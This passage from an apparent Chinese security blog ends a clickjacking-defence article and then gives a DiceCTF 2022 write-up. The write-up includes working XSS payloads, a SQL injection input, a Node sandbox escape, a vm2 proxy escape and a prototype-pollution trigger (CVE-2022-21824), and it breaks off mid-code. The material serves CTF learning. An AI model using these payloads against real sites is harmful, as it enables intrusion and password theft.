&#125; &lt;/script> 先把網頁整個藏起來，一定要執行 JS 才能開啟，所以用上面的 sandbox 阻止 script 執行的話，就只會看到一個空白的網頁；如果不用 sandbox 的話，JS 的檢查不會過，所以還是看到一片空白。 雖然說這樣可以做到比較完全的防禦，但也有缺點存在。這個缺點就是，如果使用者把 JS 功能關掉的話，他就什麼都看不到了。所以對於把 JS 功能關閉的使用者來說，體驗還滿差的。 clickjacking 早期出來的時候（2008 年）可能相關防禦還沒有這麼完全，所以只好用這些方案，但在現今 2021 年，瀏覽器已經支援了其他更好的方式來阻擋網頁被嵌入。 X-Frame-Options這個 HTTP response header 在 2009 年時首先由 IE8 實作，接著其他瀏覽器才跟上，在 2013 年時才變成了完整的 RFC7034。 這個 header 會有底下這三種值： X-Frame-Options: DENY X-Frame-Options: SAMEORIGIN X-Frame-Options: ALLOW-FROM https://example.com/ 第一種就是拒絕任何網頁把這個網頁嵌入，包含 &lt;iframe&gt;, &lt;frame&gt;, &lt;object&gt;, &lt;applet&gt;, &lt;embed&gt; 這些 tag 都不行。 第二個則是只有 same origin 的網頁可以，最後一個則是只允許特定的 origin 嵌入，除此之外其他的都不行（只能放一個值不能放列表，所以如果要多個 origin，要像 CORS header 那樣在 server 動態調整輸出）。 在 RFC 裡面還有特別提到最後兩種的判定方式可能跟你想的不一樣，每個瀏覽器的實作會有差異。 例如說有些瀏覽器可能只檢查「上一層」跟「最上層」，而不是每一層都檢查。這個「層」是什麼意思呢？因為 iframe 理論上可以有無限多層嘛，A 嵌入 B 嵌入 C 嵌入 D… 如果把這關係化為類似 html tag 的話，會長得像這樣： &lt;example.com&#x2F;A.html&gt; &lt;attacker.com&gt; &lt;example.com&#x2F;B.html&gt; &lt;example.com&#x2F;target.html&gt; 對於最內層的 target.html 來說，如果瀏覽器只檢查上一層（B.html）跟最上層（A.html）的話，那儘管設置成 X-Frame-Options: SAMEORIGIN，檢查還是會通過，因為這兩層確實是相同的 origin。但實際上，中間卻夾了一個惡意網頁在裡面，所以還是有被攻擊的風險。 除此之外 X-Frame-Options 還有第二個問題，就是 ALLOW-FROM 的支援度不好，可以參考底下來自 caniuse 的表格，黃色的都是不支援 ALLOW-FROM 的： X-Frame-Options 最前面的 X 說明了它比較像是一個過渡時期的東西，在未來新的瀏覽器當中，它的功能會被 CSP（Content Security Policy）給取代，並且把上面提到的問題解決。 CSP: frame-ancestors在之前的文章：淺談 XSS 攻擊與防禦的各個環節裡面我有稍微講了一下 CSP 這個東西，基本上就是告訴瀏覽器一些安全性相關的設置，其中有一個屬性是 frame-ancestors，設定起來會像這樣： Content-Security-Policy: frame-ancestors ‘none’ Content-Security-Policy: frame-ancestors ‘self’ Content-Security-Policy: frame-ancestors https://a.example.com https://b.example.com 這三種剛好對應到了之前 X-Frame-Options 的三種：DENY, SAMEORIGIN 以及 ALLOW-FROM（但這次有支援多個 origin 了）。 先講一個可能會被搞混的地方，frame-ancestors 限制的行為跟 X-Frame-Options 一樣，都是「哪些網頁可以把我用 iframe 嵌入」，而另外一個 CSP 規則 frame-src 則是：「我這個網頁允許載入哪些來源的 iframe」。 例如說我在 index.html 設一個規則是 frame-src: &#39;none&#39;，那 index.html 裡面用 &lt;iframe&gt; 載入任何網頁都會被擋下來，不管那個網頁有沒有設置任何東西。 再舉個例子，我的 index.html 設置成：frame-src: https://example.com，但是 example.com 也有設置：frame-ancestors: &#39;none&#39;，那 index.html 還是沒有辦法用 iframe 把 example.com 載入，因為對方拒絕了。 總而言之，frame-src 是「跟我交往好嗎？」，frame-ancestors 則是對於這個請求的回答。我可以設置成 frame-ancestors: &#39;none&#39;，代表任何人來跟我告白我都說不要。瀏覽器要成功顯示 iframe，要兩方都同意才行，只要其中一方不同意就會失敗。 另外，值得注意的是 frame-ancestors 是 CSP level2 才支援的規則，在 2014 年年底才漸漸開始被主流瀏覽器們所支援。 防禦總結因為支援度的關係，所以建議 X-Frame-Options 跟 CSP 的 frame-ancestors一起使用，若是你的網頁不想被 iframe 載入，記得加上 HTTP response header： X-Frame-Options: DENY Content-Security-Policy: frame-ancestors &#39;none&#39; 若是只允許被 same origin 載入的話，設置成： X-Frame-Options: SAMEORIGIN Content-Security-Policy: frame-ancestors &#39;self&#39; 如果要用 allow list 指定允許的來源，則是： X-Frame-Options: ALLOW-FROM https:&#x2F;&#x2F;example.com&#x2F; Content-Security-Policy: frame-ancestors https:&#x2F;&#x2F;example.com&#x2F; 實際案例接著我們來看一些實際的 clickjacking 案例，會對這個攻擊更有感覺一點。 Yelp美國最大的餐廳評論網站 Yelp 有幾個關於 clickjacking 的 report： ClickJacking on IMPORTANT Functions of Yelp CRITICAL-CLICKJACKING at Yelp Reservations Resulting in exposure of victim Private Data (Email info) + Victim Credit Card MissUse. 雖然說沒辦法達到奪取帳號這種很嚴重的攻擊，但還是可以造成一些危害，例如說自己註冊一間餐廳之後： 幫使用者訂位，藉此偷到他們的 email 幫使用者訂位，使用者要取消訂位的話就要付取消訂位的費用，造成錢財損失 對於看不爽的餐廳，也可以靠這方法去製造很多假的訂位，讓餐廳無從辨別（因為都是真的使用者來訂位） Twitter Periscope Clickjacking Vulnerability原始報告：https://hackerone.com/reports/591432日期：2019 年 5 月 這個 bug 是因為相容性問題，網頁只設置了 X-Frame-Options ALLOW-FROM 而沒有設置 CSP，這樣的話其實沒什麼用，因為現在的瀏覽器都不支援 ALLOW-FROM。 解法很簡單，就是加上 CSP 的 frame-ancestors，讓現代瀏覽器也遵守這個規則。 Highly wormable clickjacking in player card原始報告：https://hackerone.com/reports/85624日期：2015 年 8 月 這個漏洞滿有趣的，運用了前面所提到的瀏覽器實作問題。這個案例是 twitter 已經有設置 X-Frame-Options: SAMEORIGIN 跟 Content-Security-Policy: frame-ancestors &#39;self&#39;，但當時有些瀏覽器實作檢查時，只檢查 top window 是不是符合條件。 換句話說，如果是 twitter.com &#x3D;&gt; attacker.com &#x3D;&gt; twitter.com，就會通過檢查，所以還是可以被惡意網頁嵌入。 再加上這個漏洞發生在 twitter 的 timeline，所以可以達成蠕蟲的效果，clickjacking 之後就發推，然後就會有更多人看到，更多人發同樣的推文。 作者的 writeup 寫得很棒，但部落格掛掉了，這是存檔：Google YOLO [api.tumblr.com] Exploiting clickjacking vulnerability to trigger self DOM-based XSS原始報告：https://hackerone.com/reports/953579日期：2020 年 8 月 會特別挑這個案例，是因為它是攻擊鍊的串接！ 在 XSS 漏洞中有一種叫做 self XSS，意思就是通常都要使用者自己做一些操作才會中招，所以影響十分有限，許多 program 也都不接受 self XSS 的漏洞。 而這份報告把 self XSS 跟 clickjacking 串連在一起，透過 clickjacking 的方式讓使用者去觸發 self XSS，串連攻擊鍊讓這個攻擊更容易被達成，可行性更高。 以上就是一些 clickjacking 相關的實際案例，值得注意的是有一些是因為相容性問題造成的 issue，而不是沒有設定，所以設定正確也是很重要的一件事。 無法防禦的 clickjacking？clickjacking 防禦的方式說穿了就是不要讓別人可以嵌入你的網頁，但如果這個網頁的目的就是讓別人嵌入，那該怎麼辦？ 例如說 Facebook widget，大家常看到的那些「讚」跟「分享」的按鈕，就是為了讓其他人可以用 iframe 嵌入的，這類型的 widget 該怎麼辦呢？ 根據這兩篇： Clickjacking Attack on Facebook: How a Tiny Attribute Can Save the Corporation Facebook like button click 裡面得到的資訊，或許目前只能降低一點使用者體驗來換取安全性，例如說點了按鈕之後還會跳出一個 popup 讓你確認，對使用者來說多了一個點擊，但是也避免了 likejacking 的風險。 或是我猜可能也會根據網站的來源決定是否有這個行為，舉例來說在一些比較有信譽的網站，可能就不會跳出這個 popup。 我有做了一個簡單的 demo 網頁：https://aszx87410.github.io/demo/clickjacking/like.html 如果 likejacking 成功的話，點了按鈕之後會對 Facebook Developer Plugin 的粉專按讚（我自己實驗是有成功啦），大家可以試試看，按完以後可以按「顯示原始網頁」看看按鈕底下長什麼樣子，順便把讚收回來。 總結比起以前瀏覽器支援度還沒有這麼完整的時代，現在已經幸福許多了，瀏覽器也實作了愈來愈多的安全性功能以及新的 response header，透過瀏覽器保護使用者避免惡意攻擊。 雖然說平均來講 clickjacking 的攻擊難易度、先備條件以及影響程度通常都比 XSS 或是 CSRF 之類的攻擊來得低，但依然是不可忽視的風險之一。 如果你的網頁沒有要讓別的網站嵌入，記得設置 X-Frame-Options: DENY 以及 Content-Security-Policy: frame-ancestors &#39;none&#39;，告訴瀏覽器你的網頁不能被嵌入，藉此防止點擊劫持攻擊。 參考資料： TOPCLICKJACKING.md Clickjacking Defense Cheat Sheet CSP frame-ancestors","link":"/2021/09/26/what-is-clickjacking/"},{"title":"我從 DiceCTF 2022 中學到的各種 JS 與前端冷知識","text":"如果你不知道什麼是 CTF，可以參考我之前寫過的：該如何入門 CTF 中的 Web 題？，裡面有簡單介紹一下什麼是 CTF，以及一些基本的題型。 去年的 DiceCTF 2021 我有認真玩了一下，最後解出 6 題 web 題，心得都在這邊：DiceCTF 2021 - Summary。今年的 DiceCTF 我有看了一下，直接被電爆，難度完全是不同等級。 這次的 Web 題一共有 10 題，1 題水題 365 隊解開，另一題比較簡單一點 75 隊解開，其他 8 題都只有 5 隊以內解開，其中還有一題沒人解開。 身為一個喜歡 web 以及 JS 相關冷知識的人，這是一個很好的學習機會，透過賽後放出的 writeup 來學習各種技巧。底下不會有所有 web 題的筆記，只會有我關注的題目。 misc&#x2F;undefined(55 solves)這次在 misc 題型中也有一題跟 JS 相關的，題目敘述如下： I was writing some Javascript when everything became undefined… Can you create something out of nothing and read the flag at &#x2F;flag.txt? Tested for Node version 17. 原始碼長這樣： #!/usr/local/bin/node // don't mind the ugly hack to read input console.log(\"What do you want to run?\"); let inpBuf = Buffer.alloc(2048); const input = inpBuf.slice(0, require(\"fs\").readSync(0, inpBuf)).toString(\"utf8\"); inpBuf = undefined; Function.prototype.constructor = undefined; (async () => &#123;&#125;).constructor.prototype.constructor = undefined; (function*()&#123;&#125;).constructor.prototype.constructor = undefined; (async function*()&#123;&#125;).constructor.prototype.constructor = undefined; for (const key of Object.getOwnPropertyNames(global)) &#123; if ([\"global\", \"console\", \"eval\"].includes(key)) &#123; continue; &#125; global[key] = undefined; delete global[key]; &#125; delete global.global; process = undefined; &#123; let AbortController=undefined;let AbortSignal=undefined; let AggregateError=undefined;let Array=undefined; let ArrayBuffer=undefined;let Atomics=undefined; let BigInt=undefined;let BigInt64Array=undefined; let BigUint64Array=undefined;let Boolean=undefined; let Buffer=undefined;let DOMException=undefined; let DataView=undefined;let Date=undefined; let Error=undefined;let EvalError=undefined; let Event=undefined;let EventTarget=undefined; let FinalizationRegistry=undefined; let Float32Array=undefined;let Float64Array=undefined; let Function=undefined;let Infinity=undefined;let Int16Array=undefined; let Int32Array=undefined;let __dirname=undefined;let Int8Array=undefined; let Intl=undefined;let JSON=undefined;let Map=undefined; let Math=undefined;let MessageChannel=undefined;let MessageEvent=undefined; let MessagePort=undefined;let NaN=undefined;let Number=undefined; let Object=undefined;let Promise=undefined;let Proxy=undefined; let RangeError=undefined;let ReferenceError=undefined;let Reflect=undefined; let RegExp=undefined;let Set=undefined;let SharedArrayBuffer=undefined; let String=undefined;let Symbol=undefined;let SyntaxError=undefined; let TextDecoder=undefined;let TextEncoder=undefined;let TypeError=undefined; let URIError=undefined;let URL=undefined;let URLSearchParams=undefined; let Uint16Array=undefined;let Uint32Array=undefined;let Uint8Array=undefined; let Uint8ClampedArray=undefined;let WeakMap=undefined;let WeakRef=undefined; let WeakSet=undefined;let WebAssembly=undefined;let _=undefined; let exports=undefined;let _error=undefined;let assert=undefined; let async_hooks=undefined;let atob=undefined;let btoa=undefined; let buffer=undefined;let child_process=undefined;let clearImmediate=undefined; let clearInterval=undefined;let clearTimeout=undefined;let cluster=undefined; let constants=undefined;let crypto=undefined;let decodeURI=undefined; let decodeURIComponent=undefined;let dgram=undefined; let diagnostics_channel=undefined;let dns=undefined;let domain=undefined; let encodeURI=undefined;let encodeURIComponent=undefined; let arguments=undefined;let escape=undefined;let events=undefined; let fs=undefined;let global=undefined;let globalThis=undefined; let http=undefined;let http2=undefined;let https=undefined; let inspector=undefined;let isFinite=undefined;let isNaN=undefined; let module=undefined;let net=undefined;let os=undefined;let parseFloat=undefined; let parseInt=undefined;let path=undefined;let perf_hooks=undefined; let performance=undefined;let process=undefined;let punycode=undefined; let querystring=undefined;let queueMicrotask=undefined;let readline=undefined; let repl=undefined;let require=undefined;let setImmediate=undefined; let setInterval=undefined;let __filename=undefined;let setTimeout=undefined; let stream=undefined;let string_decoder=undefined;let structuredClone=undefined; let sys=undefined;let timers=undefined;let tls=undefined; let trace_events=undefined;let tty=undefined;let unescape=undefined; let url=undefined;let util=undefined;let v8=undefined;let vm=undefined; let wasi=undefined;let worker_threads=undefined;let zlib=undefined; let __proto__=undefined;let hasOwnProperty=undefined;let isPrototypeOf=undefined; let propertyIsEnumerable=undefined;let toLocaleString=undefined; let toString=undefined;let valueOf=undefined; console.log(eval(input)); &#125; 你可以執行任何程式碼，但是在幾乎所有東西都變成 undefined 的情況下，你還能做什麼呢？ 當初在看這題的時候我也沒有想到該怎麼辦，我試了幾個預設會有的東西像是 module、exports 之類的，都拿到 undefined，想說試試看用 import，結果噴了錯誤：SyntaxError: Cannot use import statement outside a module。 根據作者的 writeup，這題有兩個解。 第一個解就是雖然 import &quot;fs&quot; 行不通，但是 import(&#39;fs&#39;) 可以，我看了一下 MDN，上面寫說：「There is also a function-like dynamic import(), which does not require scripts of type&#x3D;”module”.」 所以可以這樣解： import(\"fs\").then(m=>console.log(m.readFileSync(\"/flag.txt\", \"utf8\"))) 另外一個解法則是要知道 Node.js 的一些細節，例如說你寫這樣一段程式碼： console.log(\"Trying to reach\"); return; console.log(\"dead code\"); 因為沒有 function，所以你預期 return 應該會出錯，但執行時你會發現沒有出錯，而且還真的像是有個 function 一樣。這是因為 Node.js 的 module 其實都會被放到 function 裡面，上面的程式碼會像這樣： (function (exports, require, module, __filename, __dirname) &#123; console.log(\"Trying to reach\"); return; console.log(\"dead code\"); &#125;); 我們的目標就是拿到 require 這個參數，但是因為 arguments 也變成 undefined 了，所以沒有辦法直接拿到，要間接去拿。這是什麼意思呢，我們可以先執行一個 function，然後再用 arguments.callee.caller.arguments 去拿到 parent function 的參數，像是這樣： function wrapper(flag) &#123; &#123; let flag = null let arguments = null function inner() &#123; console.log(arguments.callee === inner) // true console.log(arguments.callee.caller === wrapper) // true console.log(arguments.callee.caller.arguments[0]) // I am flag &#125; inner() &#125; &#125; wrapper('I am flag') 這題我自己比較可惜的點有兩個，一個是以前就有學生問過我那個 return 的問題，我當時只有回說外面包了一層 function，但沒有銘記在心中（？），導致完全忘記。 第二個是 arguments.callee.caller 這個操作我自己在兩年前就寫過：覺得 JavaScript function 很有趣的我是不是很奇怪。 2022-02-09 補充： 補充一下另一個我覺得很帥氣的解法，來自這邊：DiceCTF 2022 WriteUps by maple3142 這邊用了 Node.js 可以拿到 structuredStackTrace 的 feature，簡單的 POC 長這樣： function CustomError() &#123; const oldStackTrace = Error.prepareStackTrace try &#123; Error.prepareStackTrace = (err, structuredStackTrace) => structuredStackTrace Error.captureStackTrace(this) this.stack &#125; finally &#123; Error.prepareStackTrace = oldStackTrace &#125; &#125; function trigger() &#123; const err = new CustomError() for (const x of err.stack) &#123; console.log(x.getFunction()+\"\") &#125; &#125; trigger() 我們可以用 x.getFunction() 拿到上層的 function，就是 Node.js 幫忙加上 wrapper 的那個，再一樣用 arugments 去拿到參數，官方有個文件在講 Stack trace API。 然後還有一點我覺得很酷，就是上面 POC 中如果放到 undefined 這題，我們是沒有 Error 可以用的，那怎麼辦呢？ writeup 的作者用了這招： try &#123; null.f() &#125; catch (e) &#123; TypeError = e.constructor &#125; Error = TypeError.prototype.__proto__.constructor 沒錯啊！既然拿不到 Error，就先自己製造一個 TypeError，再利用 TypeError 是繼承自 Error 的特性，就可以不依靠 global 拿到 Error constructor 了，這招好帥。 web&#x2F;blazingfast(75 solves)這題的敘述是： I made a blazing fast MoCkInG CaSe converter! 簡單來說就是寫了一個會把奇數位置的字轉成大寫的轉換器，主要程式碼如下： let blazingfast = null; function mock(str) &#123; blazingfast.init(str.length); if (str.length >= 1000) return 'Too long!'; for (let c of str.toUpperCase()) &#123; if (c.charCodeAt(0) > 128) return 'Nice try.'; blazingfast.write(c.charCodeAt(0)); &#125; if (blazingfast.mock() == 1) &#123; return 'No XSS for you!'; &#125; else &#123; let mocking = '', buf = blazingfast.read(); while(buf != 0) &#123; mocking += String.fromCharCode(buf); buf = blazingfast.read(); &#125; return mocking; &#125; &#125; function demo(str) &#123; document.getElementById('result').innerHTML = mock(str); &#125; WebAssembly.instantiateStreaming(fetch('/blazingfast.wasm')).then((&#123; instance &#125;) => &#123; blazingfast = instance.exports; document.getElementById('demo-submit').onclick = () => &#123; demo(document.getElementById('demo').value); &#125; let query = new URLSearchParams(window.location.search).get('demo'); if (query) &#123; document.getElementById('demo').value = query; demo(query); &#125; &#125;) 而 blazingfast.c 程式碼如下： int length, ptr = 0; char buf[1000]; void init(int size) &#123; length = size; ptr = 0; &#125; char read() &#123; return buf[ptr++]; &#125; void write(char c) &#123; buf[ptr++] = c; &#125; int mock() &#123; for (int i = 0; i &lt; length; i ++) &#123; if (i % 2 == 1 &amp;&amp; buf[i] >= 65 &amp;&amp; buf[i] &lt;= 90) &#123; buf[i] += 32; &#125; if (buf[i] == '&lt;' || buf[i] == '>' || buf[i] == '&amp;' || buf[i] == '\"') &#123; return 1; &#125; &#125; ptr = 0; return 0; &#125; 只要 buf 裡面的內容有 &lt; 跟 &gt; 就會直接 return 1，然後 JS 那層就會回傳 No XSS for you!，所以無法輕易執行 XSS。 這題的關鍵我有找到，但是當時程式碼沒看清楚導致想錯了，可惜沒解出來。 關鍵就是利用一些奇特的字元創造出長度的差異，例如說 ß 這個字元長度是 1，但是轉成大寫之後變成兩個字： 'ß'.length // 1 'ß'.toUpperCase().length // 2，變成 SS 還有其他字元也有這種特性，可以自己 fuzzing 一下，有些字元拿來繞過長度限制很好用，像是這篇：Exploiting XSS with 20 characters limitation 就利用這招縮短長度，網址也可以用同樣的手法，可參考：domain-obfuscator 或是 Unicode Mapping on Domain names 假設我有個字串是 ßßßßßßßß&lt;b&gt;1&lt;/b&gt;，長度是 16，所以在初始化的時候 length 會是 16，但是當跑到迴圈的時候因為轉成大寫，會是 8*2+8 &#x3D; 24 個字，所以 24 個字會全部被寫進去 buf 裡面。 在 mock 函式裡面，只會檢查 length 內的東西，所以最後 8 個字不會被檢查到，可以偷渡 &lt;&gt; 這些字元進去，像這樣： 但因為所有字元都會變成大寫，所以要找一個變成大寫之後還是可以用的 XSS payload，這時候可以用 encode 過的字串，像這樣： &lt;img src&#x3D;x onerror&#x3D;&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot; &#x2F;&gt; 如此一來就搞定了，或是也可以參考更複雜的做法：https://smitop.com/p/dctf22-blazingfast/ web&#x2F;no-cookies(5 solves)這一題很有趣，敘述是： I found a more secure way to authenticate users. No cookies, no problems! 簡單來說就是有個網站，無論做什麼操作都會先問你帳號密碼，打 API 也會直接把帳號密碼帶上去，如此一來就不需要 cookie 了。 這題前端的程式碼如下： (() => &#123; const validate = (text) => &#123; return /^[^$']+$/.test(text ?? ''); &#125; const promptValid = (text) => &#123; let result = prompt(text) ?? ''; return validate(result) ? result : promptValid(text); &#125; const username = promptValid('Username:'); const password = promptValid('Password:'); const params = new URLSearchParams(window.location.search); (async () => &#123; const &#123; note, mode, views &#125; = await (await fetch('/view', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json', &#125;, body: JSON.stringify(&#123; username, password, id: params.get('id') &#125;) &#125;)).json(); if (!note) &#123; alert('Invalid username, password, or note id'); window.location = '/'; return; &#125; let text = note; if (mode === 'markdown') &#123; text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); text = text.replace(/#\\s*([^\\n]+)/g, (match, p1) => &#123; return `&lt;h1>$&#123;p1&#125;&lt;/h1>`; &#125;); text = text.replace(/\\*\\*([^\\n]+)\\*\\*/g, (match, p1) => &#123; return `&lt;strong>$&#123;p1&#125;&lt;/strong>`; &#125;); text = text.replace(/\\*([^\\n]+)\\*/g, (match, p1) => &#123; return `&lt;em>$&#123;p1&#125;&lt;/em>`; &#125;); &#125; document.querySelector('.note').innerHTML = text; document.querySelector('.views').innerText = views; &#125;)(); &#125;)(); parse Makrdown 那一段就一臉可以 XSS 的樣子： text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); 事後作者說他本來沒有想要在這邊留洞，這個洞是 GitHub copilot 寫出來的XD 但他覺得很有趣就留下來了。 這個 XSS 的洞並不難找 var text = '[abc](123\" onfocus=alert`1` autofocus=\")' text = text.replace(/\\[([^\\]]+)\\]\\(([^\\)]+)\\)/g, (match, p1, p2) => &#123; return `&lt;a href=\"$&#123;p2&#125;\">$&#123;p1&#125;&lt;/a>`; &#125;); console.log(text) // &lt;a href=\"123\" onfocus=alert`1` autofocus=\"\">abc&lt;/a> 但問題是有了 XSS 之後，該怎麼把密碼偷出來（密碼就是這題的 flag）？ 我當時怎麼看都不覺得可以偷到密碼，賽後看 writeup 才知道一個神奇的屬性：RegExp.input，這個屬性可以拿到 RegExp 最後一次的 input，例如說這樣： /a/.test('secret password') console.log(RegExp.input) // secret password 而 password 就是最後一次丟去 /^[^$&#39;]+$/.test() 的輸入，所以就可以藉此拿到 password，這真的是 mind-blowing。 但這邊還有個細節，那就是如果你用了 markdown XSS，最後配對的 regexp 就不是 password 了，所以就拿不到。這時候你必須找出 server 的 SQL injection，程式碼如下： const db = &#123; prepare: (query, params) => &#123; if (params) for (const [key, value] of Object.entries(params)) &#123; const clean = value.replace(/['$]/g, ''); query = query.replaceAll(`:$&#123;key&#125;`, `'$&#123;clean&#125;'`); &#125; return query; &#125;, get: (query, params) => &#123; const prepared = db.prepare(query, params); try &#123; return database.prepare(prepared).get(); &#125; catch &#123;&#125; &#125;, run: (query, params) => &#123; const prepared = db.prepare(query, params); try &#123; return database.prepare(prepared).run(); &#125; catch &#123;&#125; &#125;, &#125;; const id = crypto.randomBytes(16).toString('hex'); db.run('INSERT INTO notes VALUES (:id, :username, :note, :mode, 0)', &#123; id, username, note: note.replace(/[&lt;>]/g, ''), mode, &#125;); 會把所有單引號跟 $ 拿掉，然後去 replace 所有的 :param，這時候可以利用這個特性來注入，例如說這樣 (from DrBrix)： &quot;username&quot;: &quot;a :note&quot;, &quot;password&quot;: &quot;pass&quot; &quot;note&quot;: &quot;, :mode, 0, 0) -- &quot;, &quot;mode&quot;: &quot;actual note and xss&quot; 我們來看一下最後會變怎樣： // 一開始是 INSERT INTO notes VALUES (:id, :username, :note, :mode, 0) // 接著假設 id 是 123，就會變成 INSERT INTO notes VALUES ('123' :username, :note, :mode, 0) // 再來 replace username，變成 INSERT INTO notes VALUES ('123', 'a :note', :note, :mode, 0) // 再來是 note，要注意的是兩個 note 都會被 replace INSERT INTO notes VALUES ('123', 'a ', :mode, 0, 0) -- '', ', :mode, 0, 0) -- ', :mode, 0) // 最後是 mode，這時候我們已經可以控制 note 內容的值了，沒有任何限制 INSERT INTO notes VALUES ('123', 'a ', 'payload', 0, 0) -- '', ', 'payload', 0, 0) -- ', :mode, 0) 利用這個洞，就可以不依靠 markdown 來做 XSS，再利用 RegExp.input 這個神奇屬性拿到 password。 預期外解法這題的預期外解法也是超帥，不需要 RegExp.input 了，利用的特性是底下這段程式碼： document.querySelector('.note').innerHTML = text; document.querySelector('.views').innerText = views; 這段程式碼你可能會預期插入 HTML 之後，會先繼續往下執行，然後才執行 HTML 裡面的內容，例如說： &lt;div id=x>&lt;/div> &lt;div id=y>hello&lt;/div> &lt;script> x.innerHTML = '&lt;img src=x onerror=alert(window.y.innerText)>' y.innerText = 'updated' &lt;/script> 顯示出來的 alert 會是 updated，img 的事件確實是後來才執行，但如果是這樣寫的話就不一樣了： &lt;div id=x>&lt;/div> &lt;div id=y>hello&lt;/div> &lt;script> x.innerHTML = '&lt;svg>&lt;svg onload=alert(window.y.innerText)>' y.innerText = 'updated' &lt;/script> 這樣寫的話，onload 裡的東西會在 y.innerText = &#39;updated&#39; 之前執行，所以 alert 的內容會是 hello，這個 payload 其實也有記在 tinyXSS 裡面： &lt;!-- In chrome, also works inside innerHTML, even on elements not yet inserted into DOM --> &lt;svg>&lt;svg/onload=eval(name)> 那知道這個之後可以幹嘛呢？ 我們先整理一下載入筆記的程式碼，簡化後長這樣： (async () => &#123; const &#123; note, mode, views &#125; = await (await fetch('/view', &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json', &#125;, body: JSON.stringify(&#123; username, password, id: params.get('id') &#125;) &#125;)).json(); document.querySelector('.note').innerHTML = text; // 在底下這行執行之前，會先執行我們的 XSS payload document.querySelector('.views').innerText = views; &#125;)(); 現在如果我們可以在最後一行之前執行程式碼的話，就可以做一些有趣的事情。 我們可以先把 document.querySelector 蓋掉，再把 JSON.stringify 蓋掉，像是這樣： document.querySelector = function() &#123; JSON.stringify = function(data) &#123; &#125; &#125; 蓋掉之後可以幹嘛呢？蓋掉之後我們就可以用 arguments.callee.caller，存取到最外層那個匿名的 async 函式，然後再呼叫一次！再呼叫一次之後，就會再發送一次 request，然後透過 JSON.stringify 把 password 傳進去，這時我們就可以攔截到： document.querySelector = function() &#123; JSON.stringify = function(data) &#123; console.log(data.password) // flag &#125;; arguments.callee.caller() &#125; 這個非預期解來自於 @dr_brix，真的超級帥，從沒想過可以這樣做。 web&#x2F;vm-calc(2 solves)話說做個計算功能是 CTF 中常見的題型，以這題來說乍看之下會以為是 VM escape，核心程式碼如下： const &#123; NodeVM &#125; = require('vm2'); const vm = new NodeVM(&#123; eval: false, wasm: false, wrapper: 'none', strict: true &#125;); app.post(\"/\", (req, res) => &#123; const &#123; calc &#125; = req.body; if(!calc) &#123; return res.render(\"index\"); &#125; let result; try &#123; result = vm.run(`return $&#123;calc&#125;`); &#125; catch(err) &#123; console.log(err); return res.render(\"index\", &#123; result: \"There was an error running your calculation!\"&#125;); &#125; if(typeof result !== \"number\") &#123; return res.render(\"index\", &#123; result: \"Nice try...\"&#125;); &#125; res.render(\"index\", &#123; result &#125;); &#125;); 而可以拿到 flag 的程式碼是這一段： app.post(\"/admin\", async (req, res) => &#123; let &#123; user, pass &#125; = req.body; if(!user || !pass || typeof user !== \"string\" || typeof pass !== \"string\") &#123; return res.render(\"admin\", &#123; error: \"Missing username or password!\" &#125;); &#125; let hash = sha256(pass); if(users.filter(u => u.user === user &amp;&amp; u.pass === hash)[0] !== undefined) &#123; res.render(\"admin\", &#123; flag: await fsp.readFile(\"flag.txt\") &#125;); &#125; else &#123; res.render(\"admin\", &#123; error: \"Incorrect username or password!\" &#125;); &#125; &#125;); 有關於 VM escape，我所知道的都是根據這個檔案：https://gist.github.com/jcreedcmu/4f6e6d4a649405a9c86bb076905696af 裡面有一些方式很有趣，例如說這一段： //////// // Also, the vm code could throw an exception, with proxies on it. const code5 = `throw new Proxy(&#123;&#125;, &#123; get: function(me, key) &#123; const cc = arguments.callee.caller; if (cc != null) &#123; (cc.constructor.constructor('console.log(sauce)'))(); &#125; return me[key]; &#125; &#125;)`; try &#123; vm.runInContext(code5, vm.createContext(Object.create(null))); &#125; catch(e) &#123; // The following prints out 'laser' twice, (as side-effects of e // being converted to a string) followed by &#123;&#125;, which is the effect // of the console.log actually *on* this line printing out the // stringified value of the exception, which is in this case a // (proxy-wrapped) empty object. console.log(e); &#125; 丟一個 proxy 出去當 exception，然後當有人對這個 exception 執行 toString 時，就會觸發到，就可以透過 arguments.callee.caller 拿到外界的 function。 不過這題並不是要你找 vm2 0 day，而是要利用一個 Node.js 1 day，利用 prototype pollution 來繞過這一段： if(users.filter(u => u.user === user &amp;&amp; u.pass === hash)[0] !== undefined) &#123; res.render(\"admin\", &#123; flag: await fsp.readFile(\"flag.txt\") &#125;); &#125; 這個繞過我覺得也是很猛，照理來說 users.filter 因為沒條件符合，所以會返回空陣列，這時候通常都會檢查長度才對，這邊卻檢查第一個元素是不是 undefined。 這是因為如果有一個 prototype pollution 的漏洞，我們可以污染陣列的第一個屬性，那 [][0] 就會有東西，就可以讓 if 成立。 而這個漏洞編號為 CVE-2022-21824，利用方式是： console.table([&#123;x:1&#125;], [\"__proto__\"]); 這個 API 第一個參數是資料，第二個參數是要顯示的欄位，像這樣： 修復的 commit 是這一個：https://github.com/nodejs/node/commit/3454e797137b1706b11ff2f6f7fb60263b39396b 從中可以得知是 map 這個 object 的問題，我們接著來看一下 console.table 的程式碼的重點部分：lib&#x2F;internal&#x2F;console&#x2F;constructor.js // tabularData 是第一個參數 [&#123;x:1&#125;] // properties 是第二個參數 [\"__proto__\"] const map = ObjectCreate(null); let hasPrimitives = false; const valuesKeyArray = []; const indexKeyArray = ObjectKeys(tabularData); for (; i &lt; indexKeyArray.length; i++) &#123; const item = tabularData[indexKeyArray[i]]; const primitive = item === null || (typeof item !== 'function' &amp;&amp; typeof item !== 'object'); if (properties === undefined &amp;&amp; primitive) &#123; hasPrimitives = true; valuesKeyArray[i] = _inspect(item); &#125; else &#123; const keys = properties || ObjectKeys(item); // for of 的時候 key 會是 __proto__ for (const key of keys) &#123; if (map[key] === undefined) map[key] = []; // !ObjectPrototypeHasOwnProperty(item, key) 會成立 if ((primitive &amp;&amp; properties) || !ObjectPrototypeHasOwnProperty(item, key)) // 因此 map[__proto__][0] 會是空字串 map[key][i] = ''; else 